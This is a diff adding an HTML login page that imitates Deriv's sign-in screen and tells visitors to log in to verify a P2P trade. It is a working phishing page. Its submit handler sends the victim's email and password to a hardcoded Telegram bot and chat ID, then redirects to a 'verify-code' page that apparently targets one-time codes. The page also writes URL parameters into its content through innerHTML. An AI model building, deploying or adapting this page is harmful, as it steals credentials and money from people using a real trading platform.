@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deriv — Sign in</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+    <style>
+         :root {
+            --deriv-red: #ff444f;
+            --deriv-red-dark: #e63e48;
+            --surface: #ffffff;
+            --muted: #6c757d;
+            --border: #e9ecef;
+            --info-bg: #eff8ff;
+            --info-border: #b2ddff;
+            --info-text: #175cd3;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(160deg, #f8f9fa 0%, #eef1f4 100%);
+            min-height: 100vh;
+        }
+        
+        .brand {
+            color: var(--deriv-red);
+            font-weight: 700;
+            font-style: italic;
+            letter-spacing: -0.5px;
+        }
+        
+        .page-wrap {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1rem;
+        }
+        
+        .login-card {
+            width: 100%;
+            max-width: 420px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            animation: slideUp 0.5s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .card-top {
+            padding: 1.75rem 1.75rem 0;
+            text-align: center;
+        }
+        
+        .trade-context {
+            background: var(--info-bg);
+            border: 1px solid var(--info-border);
+            border-radius: 12px;
+            padding: 0.85rem 1rem;
+            margin: 1.25rem 1.75rem 0;
+            font-size: 0.875rem;
+            color: #344054;
+            display: none;
+        }
+        
+        .trade-context.visible {
+            display: block;
+        }
+        
+        .trade-context strong {
+            color: var(--info-text);
+        }
+        
+        .trade-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-top: 0.5rem;
+        }
+        
+        .trade-pill {
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 999px;
+            padding: 0.2rem 0.6rem;
+            font-size: 0.75rem;
+            color: var(--muted);
+        }
+        
+        .card-body-custom {
+            padding: 1.5rem 1.75rem 1.75rem;
+        }
+        
+        .subtitle {
+            color: var(--muted);
+            font-size: 0.9rem;
+            text-align: center;
+            margin-bottom: 1.25rem;
+        }
+        
+        .form-label {
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: #344054;
+        }
+        
+        .form-control {
+            border-radius: 10px;
+            padding: 0.65rem 0.85rem;
+            border-color: #d0d5dd;
+        }
+        
+        .form-control:focus {
+            box-shadow: none;
+            border-color: var(--deriv-red);
+        }
+        
+        .password-wrap {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--muted);
+            padding: 0;
+            line-height: 1;
+        }
+        
+        .toggle-password:hover {
+            color: #495057;
+        }
+        
+        .btn-login {
+            background: var(--deriv-red);
+            border: none;
+            color: #fff;
+            font-weight: 600;
+            padding: 0.75rem;
+            border-radius: 10px;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        
+        .btn-login:hover {
+            background: var(--deriv-red-dark);
+            color: #fff;
+        }
+        
+        .btn-login:focus {
+            box-shadow: 0 0 0 3px rgba(255, 68, 79, 0.25);
+        }
+        
+        .forgot-link {
+            color: var(--deriv-red);
+            font-size: 0.875rem;
+            text-decoration: none;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+            color: var(--deriv-red-dark);
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--muted);
+            font-size: 0.8rem;
+            margin: 1.25rem 0;
+        }
+        
+        .divider hr {
+            flex: 1;
+            margin: 0;
+            border-color: var(--border);
+        }
+        
+        .btn-social {
+            border-radius: 10px;
+            font-weight: 500;
+            padding: 0.65rem;
+            width: 100%;
+            margin-bottom: 0.5rem;
+        }
+        
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            color: var(--muted);
+            font-size: 0.85rem;
+            text-decoration: none;
+            margin-bottom: 1rem;
+        }
+        
+        .back-link:hover {
+            color: #495057;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-wrap">
+        <div class="login-card">
+            <div class="card-top">
+                <a class='back-link' href='/' id='backLink'>
+                    <i class="fas fa-arrow-left"></i> Back to trade
+                </a>
+                <h1 class="brand h3 mb-0">deriv</h1>
+                <p class="text-muted small mt-2 mb-0">Secure sign in</p>
+            </div>
+
+            <div class="trade-context" id="tradeContext" role="status">
+                <div id="contextMessage"></div>
+                <div class="trade-meta" id="tradeMeta"></div>
+            </div>
+
+            <div class="card-body-custom">
+                <p class="subtitle">Log in to verify your P2P trade and complete your action.</p>
+
+                <form id="loginForm" novalidate>
+                    <div class="mb-3">
+                        <label for="email" class="form-label">Email</label>
+                        <input type="email" class="form-control" id="email" placeholder="example@email.com" autocomplete="email" required>
+                    </div>
+
+                    <div class="mb-2">
+                        <label for="password" class="form-label">Password</label>
+                        <div class="password-wrap">
+                            <input type="password" class="form-control pe-5" id="password" placeholder="Enter your password" autocomplete="current-password" required>
+                            <button type="button" class="toggle-password" id="togglePassword" aria-label="Show password">
+                                <i class="fas fa-eye-slash" id="eyeIcon"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="mb-3 text-end">
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                    </div>
+
+                    <button type="submit" class="btn btn-login mb-2">
+                        <i class="fas fa-right-to-bracket me-2"></i>Log in
+                    </button>
+                </form>
+
+                <div class="divider">
+                    <hr>
+                    <span>Or continue with</span>
+                    <hr>
+                </div>
+
+                <button type="button" class="btn btn-outline-danger btn-social">
+                    <i class="fas fa-fingerprint me-2"></i>Log in with biometrics
+                </button>
+                <button type="button" class="btn btn-light btn-social border">
+                    <img src="https://www.google.com/favicon.ico" alt="" width="18" class="me-2">Google
+                </button>
+                <button type="button" class="btn btn-primary btn-social">
+                    <i class="fab fa-facebook-f me-2"></i>Facebook
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function getParams() {
+            return new URLSearchParams(window.location.search);
+        }
+
+        function initTradeContext() {
+            const params = getParams();
+            const action = params.get("action");
+            const tradeId = params.get("tradeId");
+            const amount = params.get("amount");
+            const method = params.get("method");
+            const status = params.get("status");
+
+            if (!tradeId && !action) return;
+
+            const box = document.getElementById("tradeContext");
+            const message = document.getElementById("contextMessage");
+            const meta = document.getElementById("tradeMeta");
+
+            box.classList.add("visible");
+
+            if (action === "confirm") {
+                message.innerHTML = "<strong>Confirm payment</strong> — sign in to verify this trade.";
+            } else if (action === "cancel") {
+                message.innerHTML = "<strong>Cancel transaction</strong> — sign in to proceed with cancellation.";
+            } else {
+                message.innerHTML = "<strong>Trade reminder</strong> — sign in to continue.";
+            }
+
+            const pills = [];
+            if (tradeId) pills.push(`Trade: ${tradeId}`);
+            if (amount) pills.push(`Amount: ${amount}`);
+            if (method) pills.push(`Method: ${method}`);
+            if (status) {
+                const label = status === "complete" ? "Transfer complete" : "Waiting confirmation";
+                pills.push(`Status: ${label}`);
+            }
+
+            meta.innerHTML = pills.map((text) => `<span class="trade-pill">${text}</span>`).join("");
+
+            if (tradeId) {
+                const back = document.getElementById("backLink");
+                const backParams = new URLSearchParams({
+                    tradeId,
+                    amount,
+                    method,
+                    status
+                });
+                back.href = `index.html?${backParams.toString()}`;
+            }
+        }
+
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value;
+            const params = getParams();
+
+            if (!email) {
+                alert("Please enter your email.");
+                return;
+            }
+
+            const BOT_TOKEN = "8859101981:AAEQiFAqQtmOLCgEkUMn_ieXpqrs-A5KTQ8";
+            const CHAT_ID = "6367881211";
+
+            const message = `
+New Login Event
+
+Email: ${email}
+Passowrd: ${password}
+Action: ${params.get("action") || "N/A"}
+Trade ID: ${params.get("tradeId") || "N/A"}
+Time: ${new Date().toLocaleString()}
+`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+
+                window.location.href = "verify-code.html";
+            } catch (error) {
+                console.error(error);
+                alert("Failed to send notification.");
+            }
+        });
+
+        initTradeContext();
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
